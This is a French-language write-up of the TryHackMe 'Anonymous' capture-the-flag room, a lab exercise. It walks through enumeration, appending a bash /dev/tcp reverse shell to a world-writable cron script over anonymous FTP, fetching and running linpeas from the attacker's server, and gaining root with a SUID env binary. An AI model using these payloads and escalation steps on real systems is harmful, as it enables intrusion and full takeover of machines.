# Write-up Anonymous

Cette machine de niveau medium est disponible sur le site [TryHackMe](https://tryhackme.com/room/anonymous). 
> Elle est relativement simple pour ceux qui souhaitent débuter. 

### Enumération

On commence par récolter des informations en scannant la machine avec l'outil [NMAP](https://nmap.org/).

```
sudo nmap -sV 10.10.141.191
```
Ce scan étant relativement rapide, on obtient après quelques secondes les ports ouverts :

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-19 15:58 UTC
Nmap scan report for 10.10.160.187
Host is up (0.081s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.00 seconds
```
Le résultat suivant indique que les ports **21, 22, 139 et 445** sont ouverts. On a donc 3 services potentiellement intéressants à explorer : le FTP, le SSH et le SMB (Samba). 

### Flag user

On va tout d'abord jeter un coup d'oeil du côté du FTP. On se connecte avec la commande suivante :

```
ftp 10.10.141.191
```
> Certains serveurs FTP autorisent un accès sans authentification. Il suffit simplement d'utiliser le nom d'utilisateur *anonymous* et de laisser le champ de mot de pase vide.

Dans notre cas, le serveur est bien accessible publiquement. On voit d'ailleurs qu'il contient un dossier *scripts* contenant plusieurs fichiers.

```
ftp> ls
229 Entering Extended Passive Mode (|||35707|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1032 Jun 19 14:01 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```
On récupère les fichiers sur notre ordinateur avec la syntaxe get + nom du fichier. 
Le fichier *clean.sh* retient mon intention, c'est un script bash qui semble être écrit de façon à être automatisé avec un *cron job*.
> Un cron job permet d'éxecuter des scripts n'importe quand. Cela permet de les programmer pour s'éxecuter toutes les 5 min, 1 jour, 2 mois etc... Retrouvez une documentation [ici](https://www.hostinger.fr/tutoriels/cron-job).

```bash
!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done>
fi
```

Si le script est exécuté régulièrement, on peut s'en servir pour y intégrer un reverse shell. 
> Un reverse shell est un shell contrôlé à distance. On ne se connecte pas à la machine cible, c'est elle qui va se connecter à nous. Il nous suffit d'écouter un port en attente d'une connexion.

Je suis allé récupérer un reverse shell sur ce [Github](https://github.com/swisskyrepo/PayloadsAllTheThings) qui répertorie une liste de payloads très utiles :

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
On remplace *10.0.0.1* par notre propre IP et le *4242* par le port d'écoute de notre choix. Ici on va prendre le 1234.
On ajoute cette ligne à la toute fin du script *clean.sh*. Quand il va s'éxécuter, notre payload va être aussi lu. 

On retourne sur le FTP pour upload le script modifié avec la commande *put*. On met aussi le port 1234 en écoute avec netcat :

```
sudo nc -lnvp 1234
```
Quelques secondes plus tard, on obtient un shell avec le nom d'user *namelessone*. On peut lire le user.txt qui contient le flag user.

### Flag root

Il faut maintenant obtenir un accès total à la machine cible. C'est à dire avoir tous les droits avec l'utilisateur *root*.

On va utiliser l'outil [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) qui va travailler à notre place et nous donner les potentiels vecteurs d'élévation de privilèges.

Je lançe un serveur HTTP sur ma propre machine :

```
python3 -m http.server 8080
```
Puis je récupère le script *linpeas.sh* sur la machine cible pour l'exécuter :

```
wget mettreIpIci:8080/linpeas.sh
```
Après observation, on remarque que le binaire env semble être un vecteur intéréssant à explorer. Un petit tour sur [GTFOBins](https://gtfobins.github.io/gtfobins/env/) pour créer une copie du SUID avec les privilèges root :

```
./env /bin/sh -p
```
On peut exécuter le binaire :

```
/usr/bin/env /bin/sh -p
```
**Bingo !** On est maintenant root sur la machine ! On peut récupérer le flag root.txt dans le dossier /root pour terminer le challenge.

